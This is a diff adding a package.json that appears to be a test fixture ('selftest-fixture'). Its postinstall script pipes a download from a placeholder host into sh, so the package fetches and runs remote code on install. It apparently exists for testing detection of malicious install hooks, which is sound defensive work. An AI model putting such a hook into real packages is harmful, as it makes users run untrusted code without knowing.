@@ -1,0 +1,10 @@
+{
+  "name": "selftest-fixture",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/x.sh | sh"
+  },
+  "dependencies": {
+    "some-lib": "git+https://github.com/example/some-lib.git"
+  }
+}
